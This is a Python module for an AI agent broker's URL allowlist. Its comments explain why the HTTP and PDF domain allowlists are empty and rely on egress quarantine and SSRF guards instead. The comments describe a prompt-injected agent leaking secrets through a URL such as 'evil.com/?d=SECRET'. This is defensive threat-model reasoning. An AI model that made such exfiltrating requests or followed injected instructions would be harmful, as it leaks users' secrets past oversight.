from __future__ import annotations

from urllib.parse import urlparse


class AllowlistViolation(Exception):
    def __init__(self, detail: str):
        self.detail = detail
        super().__init__(detail)


# HTTP_ALLOWLIST is intentionally empty — /http/fetch has no domain allowlist.
#
# Rationale (same as PDF_ALLOWLIST below): response bodies flow to a runner
# with no outbound egress, so they cannot be exfiltrated. URL-based side
# channels (`evil.com/?d=SECRET`) cannot be closed by a domain allowlist
# either — running agents must reach municipal platforms on arbitrary `.com`
# domains (Municode, PrimeGov, eSCRIBE, CivicPlus, Granicus, BoardDocs, Azure
# blob packets), and whitelisting each was a whack-a-mole blocker. The
# containment story relies on the runner's egress quarantine (no NAT, no
# IAM credentials, broker as sole egress), not on URL filtering at this layer.
#
# SSRF into private / loopback / metadata IPs is still blocked by
# http_fetch._validate_url (ported from pdf_fetch).
HTTP_ALLOWLIST: tuple[str, ...] = ()


# PDF_ALLOWLIST is intentionally empty — /pdf/fetch has no domain allowlist.
#
# Rationale: PDF binary responses flow to a runner with no egress, so the
# response cannot be exfiltrated. URL-based side channels (an injected agent
# telling broker to fetch `evil.com/?d=SECRET`) cannot be closed by a domain
# allowlist — they require the same egress-quarantine containment as
# HTTP_ALLOWLIST above.
# The SSRF guards in pdf_fetch._validate_url (block RFC1918, link-local,
# metadata, loopback) still apply.
PDF_ALLOWLIST: tuple[str, ...] = ()


# Backwards-compat: legacy consumers still import `ALLOWLIST` (check_url_allowed
# defaults to HTTP_ALLOWLIST when no explicit allowlist is passed). Kept as
# alias of HTTP_ALLOWLIST so imports continue to work.
ALLOWLIST = HTTP_ALLOWLIST


def _normalize_hostname(url: str) -> str:
    parsed = urlparse(url)
    host = (parsed.hostname or "").lower()
    return host


def check_url_allowed(url: str, allowlist: tuple[str, ...] | None = None) -> None:
    if allowlist is None:
        allowlist = HTTP_ALLOWLIST

    # Empty allowlist means "no domain restriction" (e.g. PDF_ALLOWLIST).
    if not allowlist:
        return

    host = _normalize_hostname(url)
    if not host:
        raise AllowlistViolation(detail=f"URL {url!r} has no hostname")

    for entry in allowlist:
        if entry.startswith("."):
            suffix = entry
            stripped = entry.lstrip(".")
            if host == stripped or host.endswith(suffix):
                return
        else:
            if host == entry:
                return

    raise AllowlistViolation(
        detail=(
            f"Host {host!r} is not on the broker allowlist. "
            "If this is a legitimate public civic data source, add it to "
            "broker/url_allowlist.py via code review."
        )
    )
